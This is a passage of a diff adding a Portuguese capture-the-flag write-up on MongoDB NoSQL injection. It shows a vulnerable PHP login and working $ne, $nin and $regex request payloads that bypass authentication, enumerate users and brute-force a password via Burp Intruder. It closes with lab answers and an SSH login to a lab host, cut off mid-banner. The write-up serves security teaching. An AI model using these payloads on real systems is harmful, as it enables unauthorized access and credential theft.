+&lt;code&gt;[&#39;gender&#39; =&amp;gt; &#39;male&#39;, &#39;last_name&#39; =&amp;gt; &#39;Phillips&#39;]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Pesquisando menor que:
+&lt;code&gt;[&#39;age&#39; =&amp;gt; [&#39;$lt&#39;=&amp;gt;&#39;50&#39;]]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Mais operadores: &lt;code&gt;https://www.mongodb.com/pt-br/docs/manual/reference/operator/query/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is a group of documents in MongoDB is known as?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;collection&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Using the MongoDB Operator Reference, what operator is used to filter data when a field isn&amp;rsquo;t equal to a given value?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;$ne&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Following the example of the 3 documents given before, how many documents would be returned by the following filter: &lt;code&gt;[&#39;gender&#39; =&amp;gt; [&#39;$ne&#39; =&amp;gt; &#39;female&#39;] , &#39;age&#39; =&amp;gt; [&#39;$gt&#39;=&amp;gt;&#39;65&#39;] ]&lt;/code&gt;?&lt;/strong&gt;&lt;br&gt;
+R: &lt;code&gt;0&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;nosql-injection&#34;&gt;NoSQL injection&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;nosql-injection&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#nosql-injection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Assim como no &lt;strong&gt;SQL injection&lt;/strong&gt; o NoSQL injection podemos encerrar a consulta atual e manipular, para realizarmos outra, além disso, também temos o &lt;strong&gt;operator injection&lt;/strong&gt;, nesse caso injetamos um NoSQL para alterar o comportamento da consulta, sendo assim temos dois tipos:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;NoSQL injection&lt;/li&gt;
+&lt;li&gt;Operator Injection&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;exemplo&#34;&gt;Exemplo&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;exemplo&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#exemplo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Neste exemplo iremos explorar o ataque de &lt;code&gt;operator injection&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$con &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MongoDB\Driver\Manager&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mongodb://localhost:27017&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;])){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $pass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MongoDB\Driver\Query&lt;/span&gt;([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;$user, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;$pass]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $record &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $con&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;executeQuery&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;myapp.login&amp;#39;&lt;/span&gt;, $q );
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $record &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterator_to_array&lt;/span&gt;($record);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sizeof&lt;/span&gt;($record)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                $usr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $record[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;loggedin&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uid&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $usr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: /sekr3tPl4ce.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: /?err=1&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;A consulta feita no banco de dados:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[&#39;username&#39;=&amp;gt;$user, &#39;password&#39;=&amp;gt;$pass]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Podemos manipular da seguinte maneira:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[&#39;username&#39;=&amp;gt;[&#39;$ne&#39;=&amp;gt;&#39;xxxx&#39;], &#39;password&#39;=&amp;gt;[&#39;$ne&#39;=&amp;gt;&#39;yyyy&#39;]]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Neste caso, qualquer usuário e senha, diferente de &lt;code&gt;xxxx&lt;/code&gt;e &lt;code&gt;yyyy&lt;/code&gt;já é valido, podemos autenticar na aplicação utilizando o primeiro &lt;code&gt;documento&lt;/code&gt; que é retornado na consulta.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What type of NoSQL Injection is similar to normal SQL Injection?&lt;/strong&gt;&lt;br&gt;
+R: &lt;code&gt;Syntax&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What type of NoSQL Injection allows you to modify the behaviour of the query, even if you can&amp;rsquo;t escape the syntax?&lt;/strong&gt;&lt;br&gt;
+R: &lt;code&gt;Operator&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;bypassing-the-login-screen&#34;&gt;Bypassing the Login Screen&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;bypassing-the-login-screen&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#bypassing-the-login-screen&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-bypassing.png&#34; alt=&#34;Bypassing&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Alteramos nossa requisição no Burp Suite, inserindo &lt;code&gt;[$ne]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-headers-http.png&#34; alt=&#34;HTTP-headers&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Com isso realizamos o bypass da autenticação.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-bypassed.png&#34; alt=&#34;Bypassed&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;When bypassing the login screen using the $ne operator, what is the email of the user that you are logged in as?&lt;/strong&gt;&lt;br&gt;
+R: &lt;code&gt;admin@nosql.int&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;operator-injection-logging-in-as-other-users&#34;&gt;Operator Injection: Logging in as Other Users&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;operator-injection-logging-in-as-other-users&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#operator-injection-logging-in-as-other-users&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;No ataque anterior somos limitado com qual usuário podemos acessar, o acesso é feito com o primeiro resultado que a pesquisa retorna. Podemos também acessar com outro usuário, com o operador &lt;code&gt;$nin&lt;/code&gt; conseguimos alterar o usuário que acessamos, a definição do operador.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$nin&lt;/code&gt;: Não corresponde a nenhum dos valores especificados em uma array.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Já sabemos um usuário que existe &lt;code&gt;admin&lt;/code&gt;, agora podemos especificar ele no operador &lt;code&gt;$nin&lt;/code&gt;, assim iremos acessar com outro usuário.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;user[$nin][]=admin&amp;amp;pass[$ne]=adsdasdas&amp;amp;remember=on
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;A consulta como ficaria.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[&#39;username&#39;=&amp;gt;[&#39;$nin&#39;=&amp;gt;[&#39;admin&#39;] ], &#39;password&#39;=&amp;gt;[&#39;$ne&#39;=&amp;gt;&#39;aweasdf&#39;]]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-pedro.png&#34; alt=&#34;Pedro&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Assim utilizamos a mesma logica, para ir para o terceiro usuário que o banco retorna, dessa forma podemos enumerar todos os usuários do banco de dados.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;How many users are there in total?&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Precisamos realizar a pesquisa até atingir a tela de usuário inválido &lt;code&gt;/?err=1&lt;/code&gt;.
+Payload utilizado:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;user[$nin][]=admin&amp;amp;user[$nin][]=pedro&amp;amp;user[$nin][]=john&amp;amp;user[$nin][]=secret&amp;amp;pass[$ne]=adsdasdas&amp;amp;remember=on&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;A consulta:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;[&amp;#39;username&amp;#39;=&amp;gt;[&amp;#39;$nin&amp;#39;=&amp;gt;[&amp;#39;admin&amp;#39;,&amp;#39;pedro&amp;#39;,&amp;#39;john&amp;#39;,&amp;#39;secret&amp;#39;] ], &amp;#39;password&amp;#39;=&amp;gt;[&amp;#39;$ne&amp;#39;=&amp;gt;&amp;#39;aweasdf&amp;#39;]]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;R:&lt;code&gt;4&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;There is a user that starts with the letter &amp;ldquo;p&amp;rdquo;. What is his username?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;pedro&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;operator-injection-extracting-users-passwords&#34;&gt;Operator Injection: Extracting Users&amp;rsquo; Passwords&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;operator-injection-extracting-users-passwords&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#operator-injection-extracting-users-passwords&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Temos acesso a todas as contas, porém não sabemos as senhas, é importante saber a senha pois dessa forma podemos comprometer outros serviços.&lt;/p&gt;
+&lt;p&gt;Vamos utilizar o operador &lt;code&gt;$regex&lt;/code&gt;, sua definção:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Seleciona documentos onde os valores correspondem a uma expressão regular especificada.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Podemos advinha o &lt;strong&gt;comprimento&lt;/strong&gt; da senha e depois advinha quais caracteres a senha possui.&lt;/p&gt;
+&lt;p&gt;Descobrindo o &lt;strong&gt;comprimento&lt;/strong&gt; da senha:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;[$regex]=^.{7}$&lt;/code&gt;: estamos perguntando se o parâmetro &lt;code&gt;pass&lt;/code&gt; possui comprimento de 7.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-regex.png&#34; alt=&#34;Regex&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Através da página de &lt;code&gt;/?err=1&lt;/code&gt; sabemos que a condição não é verdadeira, sendo assim o comprimento pode ser maior ou menor.
+O &lt;strong&gt;comprimento&lt;/strong&gt; é de 8.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-regex2.png&#34; alt=&#34;regex2&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Sabendo o &lt;strong&gt;comprimento&lt;/strong&gt;, agora iremos descobrir a senha, testando cada caractere (a-Z, 0-9) e também os especiais, o usuário &lt;code&gt;john&lt;/code&gt;possui apenas números na senha, conforme a dica na pergunta.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Question Hint  
+The password consists of numbers only.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Com &lt;code&gt;^0.......$&lt;/code&gt;vamos iniciar o teste, de 0-9 , depois de descobrir vamos passar para o segundo caractere &lt;code&gt;^00......$&lt;/code&gt;, até descobrirmos os 8 números da senha.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-brute.png&#34; alt=&#34;Brute&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Assim vamos descobrindo cada número da senha.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-brute2.png&#34; alt=&#34;Brute2&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Senha descoberta.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-password.png&#34; alt=&#34;password&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is john&amp;rsquo;s password?&lt;/strong&gt;&lt;br&gt;
+R:&lt;code&gt;10584312&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;{: .prompt-tip }
+Question Hint&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;The user is the same as the answer for question 2 of task 5.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Payload para descobrir o comprimento:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;user=pedro&amp;amp;pass[$regex]=^.{11}$&amp;amp;remember=on&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Lista com todas as letras do alfabeto.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;crunch &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz &amp;gt;&amp;gt; numbers.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-crunch.png&#34; alt=&#34;crunch&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Payload de teste no &lt;code&gt;intruder&lt;/code&gt;: &lt;code&gt;user=pedro&amp;amp;pass[$regex]=^§a§..........$&amp;amp;remember=on&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Encontramos a senha, após testar todos os 11 caracteres.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/03/nosql-injection/nosql-regex-password.png&#34; alt=&#34;password regex&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@ip-10-10-4-224:~# ssh pedro@10.10.201.31
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pedro@10.10.201.31&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Welcome to Ubuntu 18.04.5 LTS &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;GNU/Linux 4.15.0-147-generic x86_64&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * Documentation:  https://help.ubuntu.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * Management:     https://landscape.canonical.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * Support:        https://ubuntu.com/advantage
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;applicable law.
